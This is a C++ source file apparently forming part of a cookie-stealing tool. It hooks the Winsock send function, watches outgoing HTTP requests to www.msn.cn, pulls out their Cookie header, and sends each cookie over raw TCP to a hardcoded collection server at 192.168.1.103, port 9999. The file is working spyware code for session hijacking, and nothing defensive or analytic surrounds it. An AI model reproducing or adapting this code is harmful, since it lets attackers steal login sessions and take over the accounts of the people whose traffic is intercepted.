#include "stdafx.h"
#include "ccookiedumper.h"
#include "CHttpHeaders.h"
#include "winsock2.h"

// declare the hooks
//DECLARE_HOOK(int, __stdcall, send, (SOCKET, const char*, int, int));
extern int (__stdcall* send_Chain)(unsigned int,char const *,int,int);

#define COOKIE_SERVER "192.168.1.103"
#define CSP_HOST "www.msn.cn"


CCookieDumper::CCookieDumper(void)
{
}

CCookieDumper::~CCookieDumper()
{

}

void sendCookieToServer(CString& cookie)
{
	static SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	static bool isConnected = false;

	char *server = COOKIE_SERVER;
	int port = 9999;
	SOCKADDR_IN addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.S_un.S_addr = inet_addr(server);

	if(!isConnected) {
		if(connect(sock, (SOCKADDR*)&addr, sizeof(SOCKADDR_IN)) < 0) {
			return;
		}else{
			isConnected = true;
		}
	}
	
    //char buf[1024];
	//sprintf(buf, "isConnected %d", isConnected);
	//::MessageBox(NULL, buf, "Error", MB_ICONEXCLAMATION);

	unsigned short len = htons(cookie.GetLength());
	if(isConnected && send_Chain(sock, (char const*)&len, sizeof(len), 0) != sizeof(len)) {
		::closesocket(sock);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		isConnected = false;
	}

	if(isConnected && send_Chain(sock, cookie.GetString(), cookie.GetLength(), 0) != cookie.GetLength()) {
		::closesocket(sock);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		isConnected = false;
	}	
}

void CCookieDumper::OnRequest(DWORD context, CString& request, CHttpHeaders& headers, 
                                   bool isSSL, DWORD tickCount)
{
    //check target
	//send cookie header to server through http
	CString cookie;
	CString host;
	if(headers.GetHeader("Host",host) && host == CSP_HOST) {
		if(headers.GetHeader("Cookie", cookie)) {
			sendCookieToServer(cookie);
		}
	}

}



void CCookieDumper::OnResponse(DWORD context, CString& response, CHttpHeaders& headers, bool isSSL,
                                    bool shouldBeFiltered, DWORD tickCount)
{
	//do nothing
}
